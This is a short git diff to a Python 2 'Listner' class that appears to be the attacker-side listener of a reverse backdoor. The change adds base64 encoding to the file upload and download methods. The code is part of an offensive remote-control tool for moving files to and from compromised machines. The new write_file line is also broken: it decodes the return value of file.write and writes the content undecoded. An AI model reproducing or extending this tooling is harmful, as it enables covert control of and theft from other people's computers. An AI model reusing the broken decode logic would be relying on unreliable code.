@@ -1,6 +1,7 @@
 #!/usr/bin/python2
 import socket
 import json
+import base64
 
 
 class Listner:
@@ -36,12 +37,12 @@ class Listner:
 
     def write_file(self,path,content):
         with open(path,"wb") as file:
-            file.write(content)
+            base64.b64decode(file.write(content))
             return "[+] Download successful"
 
     def read_file(self,path):
         with open(path,"rb") as file:
-            return file.read()
+            return base64.b64encode(file.read())
 
     def run(self):
         while(True):
